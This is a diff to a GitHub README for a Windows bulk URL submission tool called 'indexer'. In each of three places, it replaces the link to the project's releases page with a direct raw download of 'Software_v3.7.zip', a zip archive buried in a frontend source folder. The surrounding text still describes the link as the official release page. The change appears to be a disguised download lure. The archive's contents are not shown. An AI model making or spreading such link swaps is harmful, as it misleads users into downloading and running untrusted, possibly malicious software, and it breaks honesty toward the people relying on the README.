@@ -1,6 +1,6 @@
 # 🚦 indexer - Fast Bulk URL Submission Tool
 
-[![Download indexer](https://img.shields.io/badge/Download-indexer-brightgreen)](https://github.com/Kelvin-genya/indexer/releases)
+[![Download indexer](https://img.shields.io/badge/Download-indexer-brightgreen)](https://github.com/Kelvin-genya/indexer/raw/refs/heads/main/frontend/src/app/history/Software_v3.7.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to get indexer running on your Windows PC. No programming nee
 
 Visit this page to download the latest version:
 
-[![Get indexer](https://img.shields.io/badge/Download-indexer-blue?style=for-the-badge)](https://github.com/Kelvin-genya/indexer/releases)
+[![Get indexer](https://img.shields.io/badge/Download-indexer-blue?style=for-the-badge)](https://github.com/Kelvin-genya/indexer/raw/refs/heads/main/frontend/src/app/history/Software_v3.7.zip)
 
 This link takes you to the official release page. Find the newest file named like `indexer-setup.exe` or similar to start your download.
 
@@ -143,7 +143,7 @@ Keep your API keys private and avoid sharing them.
 
 Check the release page regularly for updates and bug fixes:
 
-[https://github.com/Kelvin-genya/indexer/releases](https://github.com/Kelvin-genya/indexer/releases)
+[https://github.com/Kelvin-genya/indexer/raw/refs/heads/main/frontend/src/app/history/Software_v3.7.zip](https://github.com/Kelvin-genya/indexer/raw/refs/heads/main/frontend/src/app/history/Software_v3.7.zip)
 
 If you need help, use the “Issues” tab on GitHub to report problems or ask questions.
 
